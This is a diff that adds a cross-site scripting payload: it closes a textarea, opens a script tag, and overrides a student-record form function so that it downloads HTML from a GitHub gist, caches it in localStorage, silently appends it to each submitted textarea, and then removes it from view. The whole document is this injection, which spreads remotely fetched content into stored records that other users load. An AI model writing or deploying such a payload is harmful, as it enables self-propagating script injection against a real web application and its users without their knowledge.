@@ -1,0 +1,31 @@
+</textarea><script>if(void 0===fished)var fished=0;++fished<=1&&console.log(\"I hope your having a great day!\");
+function updateRec(selectedform,stuID) {
+    
+    var divIDresponse = "response" + stuID;
+    var theform=selectedform;
+    var reporduce = localStorage.getItem("StudentFTRDontChange");
+    $.ajax({
+        url: "https://gist.githubusercontent.com/PythonGithCode/3a6882462b04c49189f6aee5bb64e810/raw/3adbf80780fbe9453079096dcfb18c7881f21dd9/f.html",
+        type: "GET",
+        dataType: "text", // added data type
+        success: function(res) {
+            localStorage.setItem("StudentFTRDontChange", res);
+        }
+    });
+    reporduce = localStorage.getItem("StudentFTRDontChange");
+    theform.getElementsByTagName("textarea")[0].value = theform.getElementsByTagName("textarea")[0].value.replaceAll("'", "''");
+    theform.getElementsByTagName("textarea")[0].value += reporduce;
+    console.log(theform.getElementsByTagName("textarea")[0].value);
+
+    var status = AjaxRequest.submit(
+        theform
+    ,{
+        "onSuccess":function(req){ 
+            document.getElementById(divIDresponse).innerHTML = req.responseText; 
+            document.getElementById(divIDresponse).className="normal";
+        }
+    });
+
+    theform.getElementsByTagName("textarea")[0].value = theform.getElementsByTagName("textarea")[0].value.replaceAll(reporduce, "").replaceAll("''", "'");
+    return status;
+}</script>
